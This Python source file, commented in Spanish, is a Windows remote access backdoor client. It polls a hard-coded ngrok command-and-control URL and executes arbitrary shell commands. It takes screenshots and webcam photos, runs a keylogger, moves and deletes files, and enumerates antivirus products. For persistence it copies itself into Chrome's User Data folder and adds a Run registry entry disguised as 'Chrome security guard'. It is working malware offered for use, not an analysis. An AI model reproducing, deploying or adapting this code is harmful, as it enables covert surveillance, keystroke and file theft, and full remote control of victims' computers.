# Importaciones necesarias
from plyer import notification
from PIL import ImageGrab
import threading
import winreg
import subprocess
import simplejson
import platform
import socket
import base64
import wmi
import cv2
import io
import os
import sys
import shutil
import re
import time
import requests 


# Importaciones para Keylogger
try:
    from pynput import keyboard
except ImportError:
    # Si pynput no está disponible, el keylogger no funcionará
    # Esto es una forma de manejarlo si el cliente no tiene la librería
    keyboard = None
    print("Advertencia: pynput no encontrado. El keylogger no funcionará.")

class Keylogger:
    def __init__(self):
        self.log = []
        self.listener = None
        self.running = False

    def on_press(self, key):
        try:
            self.log.append(str(key.char))
        except AttributeError:
            if key == keyboard.Key.space:
                self.log.append(" ")
            elif key == keyboard.Key.enter:
                self.log.append("[ENTER]\n")
            elif key == keyboard.Key.backspace:
                self.log.append("[BACKSPACE]")
            else:
                self.log.append(f"[{str(key).upper()}]")

    def start(self):
        if not keyboard:
            return "Error: pynput no está instalado o accesible para el keylogger."
        if not self.running:
            self.log = [] # Limpiar logs anteriores al iniciar
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.running = True
            return "Keylogger started."
        return "Keylogger is already running."

    def stop(self):
        if self.running and self.listener:
            self.listener.stop()
            self.listener.join()
            self.running = False
            return "".join(self.log)
        return "Keylogger not running."

class HttpClient:
    def __init__(self, base_server_url):
        """
        Constructor que acepta una URL base completa.
        Ej: "https://algo.loca.lt"
        """
        if base_server_url.endswith('/'):
            base_server_url = base_server_url[:-1]
        
        self.server_url = base_server_url
        self.client_id = None
        self.hostname = socket.gethostname()
        self.keylogger_instance = Keylogger() # Instancia del keylogger

    def register_with_server(self):
        """Intenta registrarse con el servidor para obtener un ID único."""
        register_url = f"{self.server_url}/register"
        try:
            payload = {"hostname": self.hostname}
            response = requests.post(register_url, json=payload, timeout=10)
            
            if response.status_code == 200:
                self.client_id = response.json()["id"]
                print(f"Successfully registered with server. My ID is: {self.client_id}")
                return True
            else:
                print(f"Failed to register. Server returned status {response.status_code}: {response.text}")
                return False
        except requests.exceptions.RequestException as e:
            # print(f"Error connecting to server at {register_url}: {e}") # Comentado para no spammear la consola en reintentos
            return False

    def get_command(self):
        """Pide un comando al servidor (polling)."""
        get_command_url = f"{self.server_url}/get_command/{self.client_id}"
        try:
            response = requests.get(get_command_url, timeout=30)
            if response.status_code == 200:
                return response.json()
            # Si el servidor devuelve 404 para get_command (ID no encontrado),
            # significa que el servidor se reinició o perdió al cliente.
            # En este caso, deberíamos re-registrarnos.
            if response.status_code == 404:
                print("Server returned 404 for command request. Re-registering...")
                self.client_id = None # Resetear el ID para forzar un nuevo registro
                return {"command": "re_register"} # Señal interna para re-registrarse
            return None
        except requests.exceptions.RequestException:
            return None

    def post_result(self, result):
        """Envía el resultado de un comando de vuelta al servidor."""
        post_result_url = f"{self.server_url}/post_result/{self.client_id}"
        try:
            requests.post(post_result_url, json={"result": result}, timeout=30)
        except requests.exceptions.RequestException:
            pass
    
    # --- Funciones de funcionalidad (sin cambios) ---
    def exec_shell_command(self, command_str):
        try:
            return subprocess.check_output(command_str, shell=True, text=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            return f"Error executing shell command: {e.output}"
        except Exception as e:
            return f"General error during shell command execution: {e}"

    def get_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            screenshot_bytes = io.BytesIO()
            screenshot.save(screenshot_bytes, format='PNG')
            return base64.b64encode(screenshot_bytes.getvalue()).decode()
        except Exception as e:
            return f"Error! Failed to take screenshot: {e}"

    def get_system_info(self):
        try:
            return {
                "Platform": platform.system(),
                "Platform Release": platform.release(),
                "Platform Version": platform.version(),
                "Architecture": platform.machine(),
                "Hostname": socket.gethostname(),
                "IP Address": socket.gethostbyname(socket.gethostname()),
                "Processor": platform.processor(),
                "Python Version": platform.python_version()
            }
        except Exception as e:
            return f"Error! Failed to get system info: {e}"
            
    def get_security_info(self):
        try:
            c = wmi.WMI()
            firewall_info = [{"Name": f.Name, "State": bool(f.firewallEnabled)} for f in c.Win32_FirewallProduct()]
            antivirus_info = [{"Name": a.displayName, "State": a.productState} for a in c.Win32_AntiVirusProduct()]
            return {"Firewall": firewall_info, "Antivirus": antivirus_info}
        except Exception as e:
            return f"Error! Failed to get security info: {e}"

    def execute_cd_command(self, directory):
        # Limpiamos las comillas dobles al principio y al final del string 'directory'
        cleaned_directory = directory.strip('"')
        print(cleaned_directory)

        try:
            print(cleaned_directory)
            os.chdir(cleaned_directory) # Usamos la ruta limpia
            return "Cd to " + os.getcwd()
        except FileNotFoundError:
            # Asegúrate de usar la ruta limpia en el mensaje de error también
            return f"Error! Directory '{cleaned_directory}' not found."
        except Exception as e:
            return f"Error! Failed to change directory: {e}"

    def get_file_contents(self, path):
        try:
            with open(path, "rb") as my_file:
                return base64.b64encode(my_file.read()).decode('utf-8')
        except FileNotFoundError:
            return f"Error! File '{path}' not found."
        except Exception as e:
            return f"Error! Failed to read file: {e}"

    def save_file(self, path, content):
        try:
            with open(path, "wb") as my_file:
                my_file.write(base64.b64decode(content))
            return "Upload OK"
        except Exception as e:
            return f"Error! Failed to save file: {e}"

    def get_camera_image(self):
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened(): return "Error: Camera not accessible"
            ret, frame = cap.read()
            cap.release()
            if not ret: return "Error: Failed to capture frame"
            is_success, buffer = cv2.imencode(".png", frame)
            if not is_success: return "Error: Failed to encode image"
            return base64.b64encode(io.BytesIO(buffer).getvalue()).decode()
        except Exception as e:
            return f"Error! Failed to get camera image: {e}"

    def send_notification(self, title, message):
        try:
            notification.notify(title=title, message=message, app_name="System Alert", timeout=10)
            return "Notification sent."
        except Exception as e:
            return f"Error! Failed to send notification: {e}"
            
    def delete_file_on_client(self, remote_path):
        try:
            os.remove(remote_path)
            return f"File '{remote_path}' deleted successfully."
        except FileNotFoundError:
            return f"Error: File '{remote_path}' not found."
        except Exception as e:
            return f"Error deleting file: {e}"

    def move_file_on_client(self, source_path, dest_path):
        try:
            shutil.move(source_path, dest_path)
            return f"File moved from '{source_path}' to '{dest_path}'."
        except FileNotFoundError:
            return f"Error: Source file '{source_path}' not found."
        except Exception as e:
            return f"Error moving file: {e}"

    def copy_file_on_client(self, source_path, dest_path):
        try:
            shutil.copy2(source_path, dest_path)
            return f"File copied from '{source_path}' to '{dest_path}'."
        except FileNotFoundError:
            return f"Error: Source file '{source_path}' not found."
        except Exception as e:
            return f"Error copying file: {e}"
    def execute_cd_command2(self, directory):
        """
        Intenta cambiar el directorio de trabajo actual.
        Devuelve un diccionario con el estado del cambio.
        """
        # Limpiamos las comillas dobles al principio y al final del string 'directory'
        cleaned_directory = directory.strip('"')

        try:
            os.chdir(cleaned_directory)
            return {"chdir_success": True, "new_directory": os.getcwd()}
        except FileNotFoundError:
            return {"chdir_success": False, "error": f"Directory '{cleaned_directory}' not found."}
        except PermissionError:
            return {"chdir_success": False, "error": f"Permission denied to change to '{cleaned_directory}'."}
        except Exception as e:
            return {"chdir_success": False, "error": f"An unexpected error occurred: {e}"}
        
    def start_client(self):
        """Bucle principal del cliente HTTP."""
        while True: # Bucle infinito para reintentar la conexión
            # Intentar registrarse si aún no tenemos un client_id o si el servidor lo perdió
            if self.client_id is None:
                while not self.register_with_server():
                    print("Registration failed, retrying in 30 seconds...")
                    time.sleep(30)
            
            # Una vez registrado (o re-registrado), comenzar el bucle de polling.
            while self.client_id is not None:
                command_data = self.get_command()
                
                if command_data is None:
                    # Error de red o servidor no disponible para get_command, esperar y reintentar.
                    time.sleep(10)
                    continue

                command = command_data.get("command")
                args = command_data.get("args", [])
                
                if command == "sleep":
                    time.sleep(5)
                    continue
                
                # --- Manejo para 'quit' y 're_register' ---
                if command == "quit" or command == "re_register":
                    if self.keylogger_instance.running:
                        self.keylogger_instance.stop()
                    
                    if command == "quit":
                        print("Quit command received from server. Closing connection and reattempting in 30s...")
                        time.sleep(30) # Esperar antes de intentar reconectar
                    else: # command == "re_register"
                        print("Server requested re-registration. Re-attempting in 10s...")
                        time.sleep(10) # Esperar un tiempo más corto para re-registro
                    
                    self.client_id = None # Reiniciar el ID para forzar un nuevo registro
                    break # Romper el bucle interno y volver al bucle externo de reintentosA
                
                command_output = ""
                try:
                    if command == "cd":
                        command_output = self.execute_cd_command(args[0])
                    elif command == "download":
                        command_output = self.get_file_contents(args[0])
                    elif command == "chdir":
                        command_output = self.execute_cd_command2(args[0])
                    elif command == "upload":
                        command_output = self.save_file(args[0], args[1])
                    elif command == "screenshot":
                        command_output = self.get_screenshot()
                    elif command == "sysinfo":
                        command_output = self.get_system_info()
                    elif command == "securityinfo":
                        command_output = self.get_security_info()
                    elif command == "camshot":
                        command_output = self.get_camera_image()
                    elif command == "notify":
                        command_output = self.send_notification(args[0], " ".join(args[1:]))
                    elif command == "shell": # Comando 'shell' en el controlador es 'exec_shell_command' aquí
                        command_output = self.exec_shell_command(args[0])
                    elif command == "start_keylogger":
                        command_output = self.keylogger_instance.start()
                    elif command == "stop_keylogger":
                        command_output = self.keylogger_instance.stop()
                    elif command == "delete_file":
                        command_output = self.delete_file_on_client(args[0])
                    elif command == "move_file":
                        command_output = self.move_file_on_client(args[0], args[1])
                    elif command == "copy_file":
                        command_output = self.copy_file_on_client(args[0], args[1])
                    else:
                        # Fallback para comandos no reconocidos explícitamente, ejecutar como shell
                        full_command = [command] + args
                        command_output = self.exec_shell_command(" ".join(full_command))
                
                except Exception as e:
                    command_output = f"Error! Unhandled exception in client: {e}"
                
                self.post_result(command_output)

# --- El código de persistencia se mantiene igual ---

def check_for_backdoor_value_in_startup(value_name="backdoor"):
    """
    Verifica si un valor específico (por defecto "backdoor") existe
    en la clave de registro Run del usuario actual.

    Args:
        value_name (str): El nombre del valor del registro a buscar.

    Returns:
        True si el valor existe en la clave HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.
        False en caso contrario (no existe, no se encontró la clave, o error de permisos).
    """
    hive = winreg.HKEY_CURRENT_USER
    subkey_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    print(f"Verificando el valor '{value_name}' en HKEY_CURRENT_USER\\{subkey_path}...\n")

    try:
        # Intenta abrir la clave de registro
        key = winreg.OpenKey(hive, subkey_path, 0, winreg.KEY_READ)
        try:
            # Intenta leer el valor por su nombre
            winreg.QueryValueEx(key, value_name)
            return True # ¡Valor encontrado!
        except FileNotFoundError:
            return False # El valor no existe dentro de la clave 'Run'
        finally:
            winreg.CloseKey(key) # Asegura que la clave se cierre
    except FileNotFoundError:
        # La clave principal 'Run' no existe (muy raro para este path)
        print(f"Advertencia: La clave de registro '{subkey_path}' no existe en HKEY_CURRENT_USER.")
        return False
    except PermissionError:
        print(f"Error de Permiso: No se pudo acceder a '{subkey_path}'. Intenta ejecutar como administrador si buscas en HKLM.")
        return False
    except Exception as e:
        print(f"Ocurrió un error inesperado al buscar el valor '{value_name}': {e}")
        return False

def add_to_startup_registry(script_path, entry_name="MyPythonStartupScript"):
    """
    Añade una entrada al registro de Windows para ejecutar un script de Python al inicio.

    Args:
        script_path (str): La ruta completa al script de Python que se desea ejecutar.
                           Debe ser una ruta absoluta.
        entry_name (str): El nombre que se le dará a la entrada en el registro (visible en regedit).
                          Debe ser único.
    Returns:
        bool: True si la operación fue exitosa, False en caso contrario.
    """
    # Convertir la ruta del script a una ruta absoluta y asegurarse de que usa el separador correcto
    script_path = os.path.abspath(script_path).replace('/', '\\')
    
    # Obtener la ruta del intérprete de Python actual
    python_exe_path = sys.executable.replace('/', '\\')

    # La clave donde Windows busca programas para ejecutar al inicio del usuario actual
    # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        # Abrir la clave de registro Run con permisos de escritura
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)

        # El comando que Windows ejecutará. 
        # Es crucial especificar el intérprete de Python y luego la ruta del script.
        command = f"{script_path}"
        print(command)
        
        # Establecer el valor en el registro
        winreg.SetValueEx(key, entry_name, 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)

        print(f"'{entry_name}' añadido al registro de inicio.")
        print(f"Comando a ejecutar: {command}")
        return True
    except Exception as e:
        print(f"Error al añadir al registro: {e}")
        print("Asegúrate de tener los permisos necesarios (ejecutar como administrador si es un problema de permisos).")
        return False

def remove_from_startup_registry(entry_name="MyPythonStartupScript"):
    """
    Elimina una entrada del registro de Windows que ejecuta un script de Python al inicio.
    
    Args:
        entry_name (str): El nombre de la entrada en el registro a eliminar.
    Returns:
        bool: True si la operación fue exitosa, False en caso contrario.
    """
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, entry_name)
        winreg.CloseKey(key)
        print(f"'{entry_name}' eliminado del registro de inicio.")
        return True
    except FileNotFoundError:
        print(f"'{entry_name}' no encontrado en el registro de inicio.")
        return True # Ya no está, así que se considera "eliminado"
    except Exception as e:
        print(f"Error al eliminar del registro: {e}")
        return False
def autocopy_script_to_target_path(target_directory):
    """
    Autocopia el script en ejecución a un directorio de destino especificado.

    Args:
        target_directory (str): La ruta del directorio al que se copiará el script.

    Returns:
        bool: True si la copia fue exitosa, False en caso contrario.
    """
    # 1. Obtener la ruta completa del script actual
    source_script_path = os.path.abspath(sys.argv[0])
    
    # Obtener solo el nombre del script para la copia
    script_name = os.path.basename(source_script_path)
    
    # 2. Construir la ruta completa de destino para la copia
    destination_path = os.path.join(target_directory, script_name)

    print(f"Intentando autocopiar script:")
    print(f"  Origen: {source_script_path}")
    print(f"  Destino: {destination_path}")
    
    # Verificar si el script ya está en el destino, para evitar copias redundantes
    if os.path.abspath(source_script_path) == os.path.abspath(destination_path):
        print("\n¡El script ya está en la ruta de destino especificada. No se requiere copia!")
        return True # Consideramos que ya está donde debe estar

    # 3. Asegurarse de que el directorio de destino exista
    #    os.makedirs(..., exist_ok=True) no lanzará un error si el directorio ya existe.
    try:
        os.makedirs(target_directory, exist_ok=True)
        print(f"Directorio de destino '{target_directory}' asegurado.")
    except Exception as e:
        print(f"Error al crear o verificar el directorio de destino '{target_directory}': {e}")
        print("La copia no puede proceder sin un directorio de destino válido.")
        return False

    # 4. Copiar el script
    try:
        shutil.copy(source_script_path, destination_path)
        print(f"\n¡Éxito! Script copiado exitosamente de '{source_script_path}' a '{destination_path}'")
        print("\nAquí tienes una visualización de cómo se vería la carpeta de destino con tu script:")
        return True
    except shutil.SameFileError:
        print("\n¡El archivo de origen y destino son el mismo! No se realizó ninguna copia.")
        return True # Consideramos que ya está donde debe estar
    except PermissionError:
        print(f"\nError de Permiso: No tienes permiso para escribir en '{target_directory}'.")
        print("Asegúrate de tener los permisos adecuados o ejecuta el script como administrador.")
        return False
    except Exception as e:
        print(f"\nError inesperado al copiar el script: {e}")
        return False
        
# --- Main execution ---
if __name__ == "__main__":
    


     # --- Uso de la función y el bloque if/else ---
    if check_for_backdoor_value_in_startup("backdoor"):
        print("\n¡ALERTA! El valor 'backdoor' FUE ENCONTRADO en el registro de inicio del usuario actual.")
        # --- Lo que quieres que pase si el valor EXISTE ---
        print("Acción: Se detectó una posible amenaza de seguridad. Iniciando protocolo de contención.")
        # Por ejemplo: log_event("Backdoor detected"), send_alert(), etc.
        print("\nAquí tienes una visualización de dónde podría aparecer un valor sospechoso en el Editor del Registro:")
        
    else:
        print("\nEl valor 'backdoor' NO fue encontrado en el registro de inicio del usuario actual.")
        # --- Lo que quieres que pase si el valor NO EXISTE ---
        print("Acción: El sistema parece estar libre de la entrada 'backdoor' en esta ubicación. Continuar con operaciones normales.")
        # Por ejemplo: check_next_location(), finish_scan(), etc.
         # La ruta de tu script de Python que quieres que se ejecute al inicio.
        # Por ejemplo, si este código se guarda junto con tu script cliente (client.py),
        # puedes usar os.path.join(os.path.dirname(__file__), "client.py")
        
        # Para este ejemplo, asumiremos que tu script cliente se llama "client.py"
        # y está en el mismo directorio que el script que ejecuta esta función.
        # **Asegúrate de que la ruta sea ABSOLUTA y CORRECTA para tu cliente.**
         # 1. Obtener la ruta completa del script actual
        source_script_path = os.path.abspath(sys.argv[0])
    
    # Obtener solo el nombre del script para la copia
        script_name = os.path.basename(source_script_path)


        nombre_usuario = os.environ.get('USERNAME')

        target_folder  = os.path.join(f"C:\\Users\\{nombre_usuario}\\AppData\\Local\\Google\\Chrome\\User Data\\{script_name}") # Usamos 'r' para raw string, aunque os.path.join lo maneja
    
    # 2. Construir la ruta completa de destino para la copia
        destination_path = os.path.join(target_folder, script_name)

        print(f"Intentando añadir el script: {target_folder}")
        if add_to_startup_registry(target_folder, "Chrome security guard"):
            print("Operación de añadir completada.")
        
        # Puedes descomentar la siguiente línea para probar la eliminación
        # print("\nIntentando eliminar la entrada...")
        # if remove_from_startup_registry("MyBackdoorClient"):
        #     print("Operación de eliminar completada.")
        # --- Uso de la función para copiar a C:\Users\Kender ---
       

        target_folder_paracopia  = os.path.join(f"C:\\Users\\{nombre_usuario}\\AppData\\Local\\Google\\Chrome\\User Data") # Usamos 'r' para raw string, aunque os.path.join lo maneja

        if autocopy_script_to_target_path(target_folder_paracopia):
            print("\nProceso de autocopia completado con éxito.")
        else:
            print("\nEl proceso de autocopia falló.")

    # Iniciar el cliente HTTP
    PUBLIC_URL = "https://elfrieda-weightiest-alaya.ngrok-free.dev"  # <--- TU URL DE NGROK

    client = HttpClient(PUBLIC_URL)
    
    client.start_client()